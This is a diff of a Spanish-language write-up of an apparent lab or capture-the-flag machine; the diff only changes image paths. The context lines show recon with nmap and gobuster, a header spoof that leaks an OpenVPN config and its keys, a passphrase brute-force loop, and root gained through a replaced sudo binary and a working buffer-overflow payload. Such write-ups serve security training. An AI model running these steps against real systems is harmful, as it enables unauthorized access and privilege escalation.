@@ -18,7 +18,7 @@ Vamos a comenzar con un escaneo en red con ayuda de **Arp-Scan** :
 arp-scan -I ens33 --localnet --ignoredups
 ```
 
-![img1](images/Pasted%20image%2020251210210615.webp)
+![img1](/images/Pasted%20image%2020251210210615.webp)
 
 Podemos observar que tenemos la IP `192.168.1.101` ya con esto podemos intentar intuir el sistema operativo mediante el comando `ping`:
 
@@ -26,7 +26,7 @@ Podemos observar que tenemos la IP `192.168.1.101` ya con esto podemos intentar 
 ping -c 1 192.168.1.101
 ```
 
-![img2](images/Pasted%20image%2020251210211306.webp)
+![img2](/images/Pasted%20image%2020251210211306.webp)
 
 Podemos observar un `ttl=64` por lo que intuimos un sistema `Linux`.
 
@@ -36,7 +36,7 @@ Ya en este punto vamos a realizar un escaneo para intentar ver los puertos abier
 nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.101 -oG allPorts
 ```
 
-![img3](images/Pasted%20image%2020251212183944.webp)
+![img3](/images/Pasted%20image%2020251212183944.webp)
 
 Podemos observar el puerto `80` abierto, vamos a intentar determinar más información con otro escaneo mucho mas directo:
 
@@ -44,7 +44,7 @@ Podemos observar el puerto `80` abierto, vamos a intentar determinar más inform
 nmap -p80 -sVC 192.168.1.101 -oN target
 ```
 
-![img4](images/Pasted%20image%2020251212184252.webp)
+![img4](/images/Pasted%20image%2020251212184252.webp)
 
 Como podemos observar está corriendo el servicio de http por lo que es una web.
 
@@ -54,11 +54,11 @@ Realicemos un escaneo con ayuda de `whatweb` para tratar de obtener las tecnolog
 whatweb http://192.168.1.101
 ```
 
-![img5](images/Pasted%20image%2020251212184513.webp)
+![img5](/images/Pasted%20image%2020251212184513.webp)
 
 Podemos ver en tecnologías que se está implementando lo que es Apache claramente, pero nada más que me llame la atención, vamos a visitar la web a ver que encontramos:
 
-![img6](images/Pasted%20image%2020251212184806.webp)
+![img6](/images/Pasted%20image%2020251212184806.webp)
 
 No vemos nada de primeras que sea útil, vamos a inspeccionar toda la web en búsqueda de algo sospechoso.
 
@@ -68,11 +68,11 @@ Vamos a realizar un escaneo de directorios a ver que logramos ver en la web, est
 gobuster dir -u http://192.168.1.101/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 ```
 
-![img7](images/Pasted%20image%2020251212185340.webp)
+![img7](/images/Pasted%20image%2020251212185340.webp)
 
 Como vemos en la imagen tenemos una ruta `/service` vamos a ver que contiene:
 
-![img8](images/Pasted%20image%2020251212185417.webp)
+![img8](/images/Pasted%20image%2020251212185417.webp)
 
 Vemos un mensaje donde nos habla de que el contenido está disponible solo para él suponemos algún usuario de la máquina.
 
@@ -80,15 +80,15 @@ Vemos un mensaje donde nos habla de que el contenido está disponible solo para 
 
 Llevemos esto al `BurpSuite` para ver como se está tramitando la petición:
 
-![img9](images/Pasted%20image%2020251212185630.webp)
+![img9](/images/Pasted%20image%2020251212185630.webp)
 
 Ya lo tenemos en el `BurpSuite`, ahora algo que llama mi atención es que habla de ser algo solo para él, pero como está detectando su conexión, vamos a intentar modificar primero la cabecera `HOST` a ver si mediante esa lo verifica o mediate que lo hace:
 
-![img10](images/Pasted%20image%2020251212192027.webp)
+![img10](/images/Pasted%20image%2020251212192027.webp)
 
 Vemos que no nos funciona solo esto, podemos hacer uso de la cabecera `X-Forwarded-For` (está es una cabecera muy útilizada en nodos intermediarios en los cuales es necesario registrar las IP de origen, implementada para peticiones que pasan por medio de un balanceador de carga como puede ser Nginx por ejemplo), vemos que sucede:
 
-![img11](images/Pasted%20image%2020251212193539.webp)
+![img11](/images/Pasted%20image%2020251212193539.webp)
 
 Como podemos observar ya tenemos una respuestá algo extraña para ser web, pero si analizamos un poco y con un poco de búsqueda encontramos que parece ser un archivo de configuración para entablar una conexión `VPN` mediante `openVPN`.
 
@@ -98,7 +98,7 @@ Bueno, vamos a sacar mediante curl todo ese output en un archivo `.ovpn` de la s
 curl -s -X GET "http://192.168.1.101/service/" -H "X-Forwarded-For: 192.168.1.101" -o openvpn.ovpn
 ```
 
-![img12](images/Pasted%20image%2020251212202356.webp)
+![img12](/images/Pasted%20image%2020251212202356.webp)
 
 Perfecto ahora lo que podemos observar es que nos hacen falta partes del archivo donde vamos a ir rellenando por el momento de la siguiente manera, intuyendo cosas como el puerto por defecto que usa `openvn` que sería el `1194` mediante `UDP`, por lo tanto, podemos intentar escanear este puerto con nmap para ver si es verdad que está abierto:
 
@@ -106,11 +106,11 @@ Perfecto ahora lo que podemos observar es que nos hacen falta partes del archivo
 nmap --open -sU -p1194 192.168.1.101
 ```
 
-![img13](images/Pasted%20image%2020251212202741.webp)
+![img13](/images/Pasted%20image%2020251212202741.webp)
 
 Podemos observar que si está abierto el puerto, por lo tanto, comenzamos a configurar de la siguiente manera por ahora:
 
-![img14](images/Pasted%20image%2020251212202838.webp)
+![img14](/images/Pasted%20image%2020251212202838.webp)
 
 Bueno nos faltan al parecer los apartados de `ca, cert y key` los cuales son los apartados para un PKI (public key infrastructure) donde CA (Certificate Authority) sirve para verificar que el servidor al cual nos estámos conectando es legítimo, CERT que viene a ser una especie de identificación de la persona que se quiere conectar y por último KEY que es la clave privada que se implementa par que suceda la conexión.
 
@@ -120,7 +120,7 @@ Bueno necesitamos estos archivos, pero sabiendo lo que tenemos que buscar podemo
 gobuster dir -u http://192.168.1.101/service -w /usr/share/seclists/Discovery/Web-Content/common.txt -x crt,cert,key
 ```
 
-![img15](images/Pasted%20image%2020251213203140.webp)
+![img15](/images/Pasted%20image%2020251213203140.webp)
 
 Como podemos observar tenemos los archivos, podemos intentar descargar los archivos uno por uno con ayuda de `curl` :
 
@@ -136,11 +136,11 @@ curl -s -X GET "http://192.168.1.101/service/client.crt" -o client.crt
 curl -s -X GET "http://192.168.1.101/service/client.key" -o client.key
 ```
 
-![img16](images/Pasted%20image%2020251213204204.webp)
+![img16](/images/Pasted%20image%2020251213204204.webp)
 
 ya con los archivos podemos terminar de configurar el archivo de `openvpn.ovpn` de la siguiente manera:
 
-![img17](images/Pasted%20image%2020251213204418.webp)
+![img17](/images/Pasted%20image%2020251213204418.webp)
 
 Ahora con el archivo correctamente configurado vamos a realizar la conexión de la siguiente manera:
 
@@ -148,7 +148,7 @@ Ahora con el archivo correctamente configurado vamos a realizar la conexión de 
 openvpn openvpn.ovpn
 ```
 
-![img18](images/Pasted%20image%2020251213204742.webp)
+![img18](/images/Pasted%20image%2020251213204742.webp)
 
 Podemos observar que al parecer la clave o no es la correcta o está encriptada por lo que no es válida, en este punto podemos intentar desencriptar la clave mediante `openssl` con un ataque de fuerza bruta de la siguiente manera:
 
@@ -156,7 +156,7 @@ Podemos observar que al parecer la clave o no es la correcta o está encriptada 
 cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | while read user;do bash -c  "openssl rsa -in client.key -out newclient.key -passin pass:$user" &>/dev/null && echo "password: $user" && break;done
 ```
 
-![img19](images/Pasted%20image%2020251213210652.webp)
+![img19](/images/Pasted%20image%2020251213210652.webp)
 
 Mediante ese pequeño ataque de fuerza bruta podemos ver que la contraseña es `hiro`, además de que se generó el archivo `newclient.key` el cual reconfiguramos en el archivo `openvpn.ovpn` y generamos nuevamente la conexión:
 
@@ -164,7 +164,7 @@ Mediante ese pequeño ataque de fuerza bruta podemos ver que la contraseña es `
 openvpn openvpn.ovpn
 ```
 
-![img20](images/Pasted%20image%2020251213211927.webp)
+![img20](/images/Pasted%20image%2020251213211927.webp)
 
 Perfecto ya está la conexión, en este punto como podemos observar tenemos una IP que nos asigna que sería la `10.8.0.2` y tenemos al parecer una conexión a la `10.176.13.0` mediante el Host de la `10.8.0.1`.
 
@@ -174,7 +174,7 @@ En este punto lo que podemos intentar es realizar un escaneo de host mediante **
 nmap -sn 10.8.0.0/24
 ```
 
-![img21](images/Pasted%20image%2020251213212246.webp)
+![img21](/images/Pasted%20image%2020251213212246.webp)
 
 Vemos que solo detecta el host y nuestra IP por lo que no tenemos más opciones, en este punto lo que podemos hacer es un escaneo de **Nmap** a la segunda IP de la siguiente manera:
 
@@ -182,7 +182,7 @@ Vemos que solo detecta el host y nuestra IP por lo que no tenemos más opciones,
 nmap -sn 10.176.13.0/24
 ```
 
-![img22](images/Pasted%20image%2020251213212624.webp)
+![img22](/images/Pasted%20image%2020251213212624.webp)
 
 Como podemos observar se detectó una IP que sería la `10.176.13.37`, realicemos un escaneo de puertos a ver que encontramos:
 
@@ -190,7 +190,7 @@ Como podemos observar se detectó una IP que sería la `10.176.13.37`, realicemo
 nmap -p- --open -sS --min-rate 5000 -n -v -Pn 10.176.13.37
 ```
 
-![img23](images/Pasted%20image%2020251213212751.webp)
+![img23](/images/Pasted%20image%2020251213212751.webp)
 
 Como podemos observar tenemos dos puertos abiertos el `22 y 80`.
 
@@ -200,7 +200,7 @@ Algo que se me viene a la mente es intentar conectarme por el puerto `22`, si se
 ssh shinosawa@10.176.13.37
 ```
 
-![img24](images/Pasted%20image%2020251213213335.webp)
+![img24](/images/Pasted%20image%2020251213213335.webp)
 
 Podemos observar que ya tenemos conexión por ssh.
 
@@ -208,17 +208,17 @@ Podemos observar que ya tenemos conexión por ssh.
 
 En este punto lo que podemos hacer es investigar un poco el usuario con comandos usuales y vemos lo siguiente al ejecutar un `sudo -l`:
 
-![img25](images/Pasted%20image%2020251214204951.webp)
+![img25](/images/Pasted%20image%2020251214204951.webp)
 
 Podemos observar un archivo que permite la ejecución sin necesidad de poner la contraseña y está en nuestro home, veamos que se trata primero:
 
-![img26](images/Pasted%20image%2020251214205135.webp)
+![img26](/images/Pasted%20image%2020251214205135.webp)
 
 Vemos el archivo que podemos ejecutar y también podemos observar el archivo con la flag del usuario.
 
 Ejecutemos y veamos que sucede con este archivo:
 
-![img27](images/Pasted%20image%2020251214205240.webp)
+![img27](/images/Pasted%20image%2020251214205240.webp)
 
 Por el texto se entiende que se intenta conectar al servidor y que va a darnos un shell. Bueno, tenemos dos forma de resolver la máquina en este punto y vamos a ver ambas.
 
@@ -231,7 +231,7 @@ mkdir temp
 mv deepseek temp
 ```
 
-![img28](images/Pasted%20image%2020251214205615.webp)
+![img28](/images/Pasted%20image%2020251214205615.webp)
 
 Listo ahora creemos un archivo `deepseek` con instrucciones maliciosas, en este caso uno que nos permita realizar una reverse shell como root a nuestra máquina atacante de la siguiente manera:
 
@@ -242,15 +242,15 @@ chmod +x deepseek
 
 Ya con el archivo vamos a poner una reverse shell de la siguiente manera:
 
-![img29](images/Pasted%20image%2020251214210116.webp)
+![img29](/images/Pasted%20image%2020251214210116.webp)
 
 Ya con esto es cuestión de levantar un servidor en nuestra máquina atacante y ver si logramos ejecutar esto como root:
 
-![img30](images/Pasted%20image%2020251214210254.webp)
+![img30](/images/Pasted%20image%2020251214210254.webp)
 
 Listo, en este punto podemos ver la flag del usuario root:
 
-![img31](images/Pasted%20image%2020251214210316.webp)
+![img31](/images/Pasted%20image%2020251214210316.webp)
 
 Con esto terminamos la máquina.
 
@@ -258,23 +258,23 @@ Con esto terminamos la máquina.
 
 Ahora tenemos otro método y es explotando un `Buffer Overflow` al binario `deepseek`, donde primero lo vamos a pasar a nuestra máquina atacante para lograr analizarlo:
 
-![img32](images/Pasted%20image%2020251214210710.webp)
+![img32](/images/Pasted%20image%2020251214210710.webp)
 
 Ya con el archivo en nuestra máquina vamos a analizarlo rápidamente con ayuda de `ghidra` haciendo un poco de ingeniería inversa. El propósito será netamente en este punto es encontrar el punto donde posiblemente inyectar el buffer overflow:
 
-![img33](images/Pasted%20image%2020251214211140.webp)
+![img33](/images/Pasted%20image%2020251214211140.webp)
 
 Analizamos la función `main` y vemos que dentro llama a la función `vuln`, vemos que contiene:
 
-![img34](images/Pasted%20image%2020251214211449.webp)
+![img34](/images/Pasted%20image%2020251214211449.webp)
 
 Podemos observar que dentro guarda una variable local que tiene un espacio asignado de 64 bytes, pero al guardar con ayuda de `fgets`, tiene un valor que no entendemos a primera, pero si lo seleccionamos vemos que nos sale en decimal:
 
-![img35](images/Pasted%20image%2020251214211558.webp)
+![img35](/images/Pasted%20image%2020251214211558.webp)
 
 Vemos que son `256` bytes, por lo tanto, aquí tenemos un desbordamiento, ahora podríamos intentar aquí en este punto intentar un ret2libc o alguna otra técnica, pero primero veamos las demás funciones a ver si no tenemos algo útil primero:
 
-![img36](images/Pasted%20image%2020251214211922.webp)
+![img36](/images/Pasted%20image%2020251214211922.webp)
 
 Vemos que tenemos una función `execute` la cual nos da una `sh`. Esto ya me ayuda mucho, ya que ahora mi ataque se basara en explotar el buffer y redirigir el programa a esta función, en este punto lo que voy a hacer es analizar con ayuda de `gdb` el binario de la siguiente manera:
 
@@ -282,7 +282,7 @@ Vemos que tenemos una función `execute` la cual nos da una `sh`. Esto ya me ayu
 gdb ./deepseek -q
 ```
 
-![img37](images/Pasted%20image%2020251214212132.webp)
+![img37](/images/Pasted%20image%2020251214212132.webp)
 
 Ahora conociendo el punto exacto done se tiene que explotar el buffer vamos a crear directamente una carga para identificar el número de caracteres que me permite llegar al `rsp` que es mi objetivo:
 
@@ -290,13 +290,13 @@ Ahora conociendo el punto exacto done se tiene que explotar el buffer vamos a cr
 pattern create 200
 ```
 
-![img38](images/Pasted%20image%2020251214212316.webp)
+![img38](/images/Pasted%20image%2020251214212316.webp)
 
 Copiamos los caracteres y ejecutamos el programa para intentar ver en que punto se sobreescribe el `rsp`:
 
-![img39](images/Pasted%20image%2020251214212420.webp)
+![img39](/images/Pasted%20image%2020251214212420.webp)
 
-![img40](images/Pasted%20image%2020251214212439.webp)
+![img40](/images/Pasted%20image%2020251214212439.webp)
 
 excelente logramos el cometido, ahora vamos a identificar cuantos caracteres son antes de sobreescribirlo:
 
@@ -304,20 +304,20 @@ excelente logramos el cometido, ahora vamos a identificar cuantos caracteres son
 pattern offset $rsp
 ```
 
-![img41](images/Pasted%20image%2020251214212604.webp)
+![img41](/images/Pasted%20image%2020251214212604.webp)
 
 Vemos que nos indica un total de 72 caracteres, probemos.
 Generamos la carga útil con python:
 
-![img42](images/Pasted%20image%2020251214212724.webp)
+![img42](/images/Pasted%20image%2020251214212724.webp)
 
-![img43](images/Pasted%20image%2020251214212758.webp)
+![img43](/images/Pasted%20image%2020251214212758.webp)
 
-![img44](images/Pasted%20image%2020251214212815.webp)
+![img44](/images/Pasted%20image%2020251214212815.webp)
 
 Perfecto, si funciona, en este punto verifiquemos que protecciones tiene el binario:
 
-![img45](images/Pasted%20image%2020251214212935.webp)
+![img45](/images/Pasted%20image%2020251214212935.webp)
 
 Observamos que todo está desactivado, pero el que más nos importaba era la de `PIE` la cual si se combina con el ASLR nos impiden este tipo de ataque, pero al estar desactivado podemos ejecutarlo.
 
@@ -327,7 +327,7 @@ Ahora identifiquemos cuál es el espacio en memoria que almacena la función `ex
 objdump -d deepseek | grep execute
 ```
 
-![img46](images/Pasted%20image%2020251214213300.webp)
+![img46](/images/Pasted%20image%2020251214213300.webp)
 
 Perfecto ya con esto tenemos que poner esa memoria en formato Little Endian, donde el byte menos significativo va primero, quedando de la siguiente manera:
 
@@ -348,7 +348,7 @@ Ya tenemos todo lo que necesitamos para romper el sistema, por lo que vamos a ju
 (python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x66\x12\x40\x00\x00\x00\x00\x00")';/bin/cat) | ./deepseek
 ```
 
-![img47](images/Pasted%20image%2020251214214543.webp)
+![img47](/images/Pasted%20image%2020251214214543.webp)
 
 Ya funciona en local, en este punto probemos en la máquina víctima de la siguiente manera:
 
@@ -356,14 +356,14 @@ Ya funciona en local, en este punto probemos en la máquina víctima de la sigui
 (python3 -c 'import sys;sys.stdout.buffer.write(b"A"*72+b"\x66\x12\x40\x00\x00\x00\x00\x00")';/bin/cat) | sudo /home/shinosawa/deepseek
 ```
 
-![img48](images/Pasted%20image%2020251214214745.webp)
+![img48](/images/Pasted%20image%2020251214214745.webp)
 
 Perfecto ya tenemos la shell como root.
 
 Podemos ver la flag:
 
-![img49](images/Pasted%20image%2020251214214803.webp)
+![img49](/images/Pasted%20image%2020251214214803.webp)
 
 Lab Terminado.
 
-![img50](images/Pasted%20image%2020251214214826.webp)
+![img50](/images/Pasted%20image%2020251214214826.webp)
